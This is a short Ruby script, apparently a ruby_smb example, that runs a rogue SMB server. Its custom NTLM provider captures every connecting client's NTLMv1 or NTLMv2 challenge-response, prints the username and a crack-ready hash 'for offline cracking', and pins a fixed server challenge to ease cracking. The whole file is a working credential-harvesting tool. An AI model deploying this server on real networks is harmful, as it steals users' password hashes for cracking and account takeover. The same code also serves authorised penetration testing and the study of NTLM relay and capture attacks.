#!/usr/bin/ruby

require 'bundler/setup'
require 'ruby_smb'
require 'ruby_smb/gss/provider/ntlm'

# we just need *a* default encoding to handle the strings from the NTLM messages
Encoding.default_internal = 'UTF-8' if Encoding.default_internal.nil?

def bin_to_hex(s)
  s.each_byte.map { |b| b.to_s(16).rjust(2, '0') }.join
end

# this is a custom NTLM provider that will log the challenge and responses for offline cracking action!
class HaxorNTLMProvider < RubySMB::Gss::Provider::NTLM
  class Authenticator < RubySMB::Gss::Provider::NTLM::Authenticator
    # override the NTLM type 3 process method to extract all of the valuable information
    def process_ntlm_type3(type3_msg)
      username = "#{type3_msg.domain.encode}\\#{type3_msg.user.encode}"
      _, client = ::Socket::unpack_sockaddr_in(@server_client.getpeername)

      hash_type = nil
      hash = "#{type3_msg.user.encode}::#{type3_msg.domain.encode}"

      case type3_msg.ntlm_version
      when :ntlmv1
        hash_type = 'NTLMv1-SSP'
        hash << ":#{bin_to_hex(type3_msg.lm_response)}"
        hash << ":#{bin_to_hex(type3_msg.ntlm_response)}"
        hash << ":#{bin_to_hex(@server_challenge)}"
      when :ntlmv2
        hash_type = 'NTLMv2-SSP'
        hash << ":#{bin_to_hex(@server_challenge)}"
        hash << ":#{bin_to_hex(type3_msg.ntlm_response[0...16])}"
        hash << ":#{bin_to_hex(type3_msg.ntlm_response[16.. -1])}"
      end

      puts "[SMB] #{hash_type} Client   : #{client}"
      puts "[SMB] #{hash_type} Username : #{username}"
      puts "[SMB] #{hash_type} Hash     : #{hash}"

      WindowsError::NTStatus::STATUS_ACCESS_DENIED
    end
  end

  def new_authenticator(server_client)
    # build and return an instance that can process and track stateful information for a particular connection but
    # that's backed by this particular provider
    Authenticator.new(self, server_client)
  end

  # we're overriding the default challenge generation routine here as opposed to leaving it random (the default)
  def generate_server_challenge(&block)
    "\x11\x22\x33\x44\x55\x66\x77\x88"
  end
end

# define a new server with the custom authentication provider
server = RubySMB::Server.new(
  gss_provider: HaxorNTLMProvider.new
)
puts "server is running"
server.run do
  puts "received connection"
  # accept all of the connections and run forever
  true
end
